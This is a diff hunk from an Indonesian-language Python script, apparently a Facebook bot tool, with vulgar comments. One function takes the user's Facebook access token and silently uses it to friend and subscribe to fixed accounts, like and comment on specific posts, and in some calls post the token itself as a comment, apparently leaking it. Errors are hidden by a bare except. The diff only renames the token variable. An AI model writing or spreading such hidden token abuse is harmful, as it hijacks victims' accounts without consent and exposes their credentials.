@@ -220,20 +220,20 @@ def moch_yayan():
 # Yang ganti bot nya gw sumpahin mak lo mati ajg!
 def wuhan(kontol):
     try:
-        kentod = token
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
-	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
-        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
-	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
-	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
-	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
-	requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
-	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
-	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
-        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,token))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,token,token))
-        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,token))
+        kentod = kontol
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+kontol)
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+kontol)
+        requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+kontol)
+	requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+kontol)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+kontol)
+	requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+kontol)
+	requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+kontol)
+	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+kontol)
+	requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+kontol)
+	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,kontol,kontol))
+        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kontol))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kontol,kontol))
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kontol))
     except:
     	pass
 
